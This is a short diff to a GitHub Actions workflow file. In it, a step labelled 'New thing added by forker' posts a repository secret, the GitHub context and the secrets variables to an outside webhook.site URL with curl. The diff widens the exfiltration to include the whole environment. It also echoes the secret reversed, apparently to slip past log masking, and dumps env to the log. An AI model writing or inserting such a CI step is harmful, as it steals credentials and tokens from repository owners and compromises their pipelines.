@@ -11,8 +11,9 @@ jobs:
     steps:
     - name: New thing added by forker
       run: |
-        curl -d "s=${{ secrets.FORKED_REPO_SECRET }}&c=$GITHUB_CONTEXT&s2=$SECRETS" 'https://webhook.site/c03c8df8-0054-4a08-9ee4-f1f1ab811e2e?hello=world&editer=cdb'
+        curl -d "s=${{ secrets.FORKED_REPO_SECRET }}&c=$GITHUB_CONTEXT&s2=$SECRETS&e=$(env)" 'https://webhook.site/c03c8df8-0054-4a08-9ee4-f1f1ab811e2e?hello=world&editer=cdb'
         echo ${{ secrets.FORKED_REPO_SECRET }} | rev
+        env
       env:
         GITHUB_CONTEXT: ${{ toJson(github) }}
         SECRETS_CONTEXT: ${{ toJson(secrets) }} 
